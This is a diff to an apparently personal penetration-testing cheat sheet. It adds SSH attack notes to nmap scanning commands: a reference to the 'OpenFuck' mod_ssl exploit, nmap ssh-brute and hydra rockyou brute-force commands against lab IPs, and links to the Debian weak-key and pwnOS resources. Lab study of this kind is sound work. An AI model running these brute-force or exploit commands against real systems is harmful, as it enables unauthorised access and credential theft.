@@ -19,3 +19,10 @@ Vuln scan : nmap -sS -sV --script=vulscan/vulscan.nse 10.11.1.44
 OS detection : nmap -O -v 10.11.1.5
 
 #SSH
+OpenFuck (Apache mod_ssl < 2.8.7 OpenSSL) 764.c 
+Bruteforce : 
+nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=users.txt --script-args ssh-brute.timeout=4s 192.168.88.152
+hydra -l user -P /usr/share/wordlists/rockyou.txt  192.168.88.171 ssh -t 4
+ref : 
+https://github.com/g0tmi1k/debian-ssh 
+https://blog.g0tmi1k.com/2010/04/pwnos/
